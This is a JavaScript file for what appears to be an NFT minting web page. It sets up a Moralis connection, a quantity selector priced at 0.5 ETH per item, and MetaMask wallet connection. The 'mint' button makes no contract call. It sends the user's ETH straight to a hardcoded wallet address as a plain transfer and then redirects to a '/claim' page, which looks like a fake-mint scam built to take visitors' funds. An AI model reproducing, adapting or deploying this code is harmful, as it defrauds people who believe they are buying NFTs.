window.onload = main
const serverUrl = "https://b4upz3w3ye4p.usemoralis.com:2053/server";
const appId = "lePmHZif6BunoJK638wYmee7SgmOofuzebVkJyzu";
Moralis.start({ serverUrl, appId });
function changeQuantity(price) {
  const maxQuantity = 10
  const minQuantity = 1

  const incrementOnId = "plus"
  const decrementOnId = "minus"

  const quantity = document.querySelector("#quantity")
  const total = document.querySelector("#total")
  const total1 = document.querySelector("#total1")
  const mintChange = document.querySelectorAll(".mint-change")
  const mintChangeMap = Array.prototype.slice.call(mintChange)

  const updateTotal = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    var rounded = function(number){
    return +number.toFixed(2);
}
    total.innerHTML = rounded(price * currentQuantity)
    total1.innerHTML = rounded(price * currentQuantity) + " ETH"
  }

  const incrementQuantity = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    if (currentQuantity === maxQuantity)
      return
    quantity.innerHTML = currentQuantity + 1
  }
  const decrementQuantity = () => {
    const currentQuantity = parseInt(quantity.innerHTML)
    if (currentQuantity === minQuantity)
      return
    quantity.innerHTML = currentQuantity - 1
  }

  function onMintChangeClick(event) {
    const type = event.target.id
    if (type === incrementOnId)
      incrementQuantity()
    if (type === decrementOnId)
      decrementQuantity()
    updateTotal()
  }

  updateTotal()
  mintChangeMap.map(el => el.addEventListener("click", onMintChangeClick))

}

function mint(wallet) {
  const totalElement = document.querySelector("#total")
  const mintNow = document.querySelector("#mint-now")
  const connectWallet = document.querySelector("#connect-wallet")


  const isMetaMaskInstalled = () => {
    const { ethereum } = window;
    return Boolean(ethereum && ethereum.isMetaMask) || false
  };
  const isMetaMaskConnected = async () => {
    if (typeof web3 === 'undefined') return false

    let accounts = await ethereum.request({ method: 'eth_accounts' })
    return accounts.length > 0;
  }
  const redirectToClaim = () => {
    window.open('/claim');
  }
  async function onConnectClick() {
    await ethereum.request({ method: 'eth_requestAccounts' })
    await Moralis.enableWeb3();
  }
  async function mint() {
    if (!await isMetaMaskConnected())
      onConnectClick()
    

    try {
      const total = totalElement.innerHTML * 1000000000000000000
      const adress = (await ethereum.request({ method: 'eth_accounts' }))[0]
      await ethereum.request({
        method: 'eth_sendTransaction',
        params: [
          {
            from: adress,
            to: wallet,
            value: total.toString(16)
          },
        ],
      });
      redirectToClaim()
    } catch (error) {
      console.error(error);
    }
  }


  mintNow.addEventListener("click", mint)
  connectWallet.addEventListener("click", onConnectClick)

}

function main() {
  const price = 0.5
  const wallet = "0xed3D127fd272dF38E4180F1f8FEdf17EeA26f8f4"

  changeQuantity(price)
  mint(wallet)
}
